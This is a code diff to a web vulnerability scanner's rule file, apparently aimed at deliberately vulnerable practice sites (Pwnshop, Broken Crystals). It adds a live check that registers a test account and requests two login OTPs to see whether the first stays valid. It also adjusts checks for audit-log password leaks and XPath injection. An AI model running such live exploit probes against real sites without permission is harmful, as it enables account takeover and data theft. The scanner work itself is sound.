@@ -36268,7 +36268,11 @@ const pwnshopAuditLogPlaintextPasswordLiveOracle: Rule = async (ctx) => {
     "i"
   );
   // Events API indexes login audit rows asynchronously — use fetchDoc (not probe cache) after each login attempt.
-  const waitsMs = [0, 400, 800, 1200, 1800, 2500];
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const logsRoute = /\/(?:logs|api\/v1\/events)\b/i.test(pageUrl);
+  const waitsMs = logsRoute
+    ? [0, 600, 1200, 1800, 2500, 3500, 4500, 6000, 8000]
+    : [0, 400, 800, 1200, 1800, 2500];
   for (const waitMs of waitsMs) {
     if (waitMs > 0) await pwnshopSleep(waitMs);
     const eventsDoc = await fetchDoc(eventsUrl, { maxBytes: 16384, timeoutMs: 15000 });
@@ -36318,15 +36322,22 @@ export async function primePwnshopAuditLogOracleForDeepScan(
 ): Promise<void> {
   if (!/pwnshop|ctfsecurity\.com/i.test(origin)) return;
   if (!/\/(?:logs|api\/v1\/events)\b/i.test(scanUrl)) return;
-  // Warm login path only — events fetch uses fetchDoc in the oracle to avoid stale probe-cache hits.
-  const loginUrl = new URL("/login", origin).toString();
-  await probe.get(loginUrl, {
-    method: "POST",
-    body: `username=thugir_prime_${Date.now()}&password=ThugirPrimeWarmup1`,
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    maxBytes: 4096,
-    timeoutMs: 15000
-  });
+  const ctx: RuleContext = { origin, scanUrl, home, scripts: [], combined: "", probe };
+  await pwnshopAuditLogPlaintextPasswordLiveOracle(ctx);
+}
+
+/** Pre-warm OTP invalidation oracle on reset-password and verify-otp route scans (PWN-024). */
+export async function primePwnshopResetPasswordOracleForDeepScan(
+  probe: ProbeCache,
+  origin: string,
+  scanUrl: string,
+  home: FetchedDoc
+): Promise<void> {
+  if (!/pwnshop|ctfsecurity\.com/i.test(origin)) return;
+  if (!/\/(?:reset-password|forgot-password|verify-otp|login)\b/i.test(scanUrl)) return;
+  clearPwnshopOtpSessionForProbe(probe);
+  const ctx: RuleContext = { origin, scanUrl, home, scripts: [], combined: "", probe };
+  await pwnshopOtpNotInvalidatedLiveOracle(ctx);
 }
 
 const pwnshopVerifiedAdminOtpSessionByProbe = new WeakMap<
@@ -36869,6 +36880,129 @@ const pwnshopVerifyOtpBruteforceLiveOracle: Rule = async (ctx) => {
       url: otpUrl,
       attempts: otps.length,
       note: "Pwnshop POST /verify-otp accepts rapid OTP guesses without HTTP 429 or lockout — brute-forceable 2FA oracle (PWN-015)"
+    }
+  };
+};
+
+async function pwnshopPollLoginOtp(ctx: RuleContext, cookie: string): Promise<string | null> {
+  const OTP_MAIL_WAITS_MS = [1500, 2500, 3500, 4500, 5500, 6500, 7500, 8500, 10500];
+  for (const waitMs of OTP_MAIL_WAITS_MS) {
+    await pwnshopSleep(waitMs);
+    const inboxToken = await pwnshopMailInboxToken(ctx, cookie);
+    if (!inboxToken) continue;
+    const otp = await pwnshopOtpFromMailInbox(ctx, cookie, inboxToken);
+    if (otp) return otp;
+  }
+  return null;
+}
+
+const pwnshopOtpNotInvalidatedLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  clearPwnshopOtpSessionForProbe(ctx.probe);
+  const username = `thugir_otpinv_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const email = `${username}@probe.local`;
+  const password = "ThugirTest123!";
+  for (let regAttempt = 0; regAttempt < 3; regAttempt++) {
+    const registerDoc = await fetchDoc(new URL("/register", ctx.origin).toString(), {
+      method: "POST",
+      body: `username=${encodeURIComponent(username)}&email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      maxBytes: 4096,
+      timeoutMs: 15000
+    });
+    if (registerDoc.status === 429 || /rate limit|too many requests/i.test(registerDoc.body)) {
+      await pwnshopSleep(2000 + regAttempt * 2500);
+      continue;
+    }
+    let cookie = pwnshopSessionCookieFromDoc(registerDoc);
+    if (!cookie) return NEGATIVE;
+    const login1 = await fetchDoc(new URL("/login", ctx.origin).toString(), {
+      method: "POST",
+      body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Cookie: cookie
+      },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    if (login1.status === 429 || /rate limit|too many requests/i.test(login1.body)) {
+      await pwnshopSleep(2000 + regAttempt * 2500);
+      continue;
+    }
+    const login1Location = login1.headers["location"] || "";
+    if (![301, 302, 303, 307, 308].includes(login1.status) || !/verify-otp/i.test(login1Location)) {
+      return NEGATIVE;
+    }
+    cookie = pwnshopSessionCookieFromDoc(login1) ?? cookie;
+    const otp1 = await pwnshopPollLoginOtp(ctx, cookie);
+    if (!otp1) return NEGATIVE;
+    const login2 = await fetchDoc(new URL("/login", ctx.origin).toString(), {
+      method: "POST",
+      body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Cookie: cookie
+      },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    const login2Location = login2.headers["location"] || "";
+    if (![301, 302, 303, 307, 308].includes(login2.status) || !/verify-otp/i.test(login2Location)) {
+      return NEGATIVE;
+    }
+    cookie = pwnshopSessionCookieFromDoc(login2) ?? cookie;
+    const otp2 = await pwnshopPollLoginOtp(ctx, cookie);
+    if (!otp2) return NEGATIVE;
+    const verifyUrl = new URL("/verify-otp", ctx.origin).toString();
+    const verifyDoc = await fetchDoc(verifyUrl, {
+      method: "POST",
+      body: `otp=${otp1}`,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Cookie: cookie
+      },
+      maxBytes: 4096,
+      timeoutMs: 15000,
+      redirect: "manual"
+    });
+    if (![301, 302, 303, 307, 308].includes(verifyDoc.status)) return NEGATIVE;
+    const verifyLocation = verifyDoc.headers["location"] || "";
+    if (!verifyLocation || /verify-otp/i.test(verifyLocation)) return NEGATIVE;
+    if (/Invalid or expired code/i.test(verifyDoc.body)) return NEGATIVE;
+    return {
+      fired: true,
+      confidence: otp1 !== otp2 ? 0.93 : 0.91,
+      evidence: {
+        verifyUrl,
+        username,
+        firstOtpRedacted: `${otp1.slice(0, 2)}****`,
+        secondOtpIssued: otp1 !== otp2,
+        redirect: verifyLocation,
+        note: "Pwnshop POST /login issues a new OTP but the prior OTP still verifies at POST /verify-otp — OTP not invalidated on new request (PWN-024)"
+      }
+    };
+  }
+  return NEGATIVE;
+};
+
+const pwnshopOtpNotInvalidatedRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:reset-password|forgot-password|verify-otp|login)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await pwnshopOtpNotInvalidatedLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: /\/reset-password\b/i.test(pageUrl)
+        ? "Pwnshop /reset-password route scan — new login OTP requests do not invalidate prior OTPs at POST /verify-otp (PWN-024)"
+        : "Pwnshop OTP/password-reset route scan — prior login OTP still verifies after a second POST /login issues a new code (PWN-024)"
     }
   };
 };
@@ -77042,7 +77176,7 @@ const brokencrystalsPartnerLoginXpathLiveOracle: Rule = async (ctx) => {
 const brokencrystalsPartnerLoginXpathRouteLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
-  if (!/\/partnerLogin/i.test(pageUrl)) return NEGATIVE;
+  if (!/\/api\/partners\/(?:partnerLogin|partner1)\b/i.test(pageUrl)) return NEGATIVE;
   const result = await brokencrystalsPartnerLoginXpathLiveOracle(ctx);
   if (!result.fired) return NEGATIVE;
   return {
@@ -77051,7 +77185,9 @@ const brokencrystalsPartnerLoginXpathRouteLiveOracle: Rule = async (ctx) => {
     evidence: {
       ...result.evidence,
       scannedUrl: pageUrl,
-      note: "Broken Crystals /api/partners/partnerLogin route scan — boolean XPATH injection leaks multiple <password> elements in XML response"
+      note: /\/partner1\b/i.test(pageUrl)
+        ? "Broken Crystals /api/partners/partner1 route scan — partnerLogin boolean XPATH injection leaks multiple <password> elements in XML response"
+        : "Broken Crystals /api/partners/partnerLogin route scan — boolean XPATH injection leaks multiple <password> elements in XML response"
     }
   };
 };
@@ -85745,6 +85881,8 @@ export const RULES: Record<string, Rule> = {
   pwnshopMassAssignmentAdminLiveOracle,
   pwnshopOpenRedirectRegisterLiveOracle,
   pwnshopVerifyOtpBruteforceLiveOracle,
+  pwnshopOtpNotInvalidatedLiveOracle,
+  pwnshopOtpNotInvalidatedRouteLiveOracle,
   pwnshopMailInboxIdorLiveOracle,
   pwnshopMailIdorRouteLiveOracle,
   pwnshopProductReviewStoredXssLiveOracle,
